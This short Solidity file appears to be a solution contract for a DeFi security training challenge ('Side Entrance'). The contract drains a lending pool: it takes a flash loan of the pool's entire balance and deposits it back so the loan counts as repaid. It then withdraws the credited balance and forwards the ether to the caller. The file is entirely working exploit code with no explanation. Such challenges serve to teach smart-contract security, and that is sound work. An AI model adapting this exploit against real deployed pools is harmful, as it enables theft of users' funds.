// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool private _pool;

    constructor(SideEntranceLenderPool pool) {
        _pool = pool;
    }

    function attack() external payable {
        _pool.flashLoan(address(_pool).balance);
        _pool.withdraw();
        msg.sender.call{value: address(this).balance}("");
    }

    function execute() external payable {
        _pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
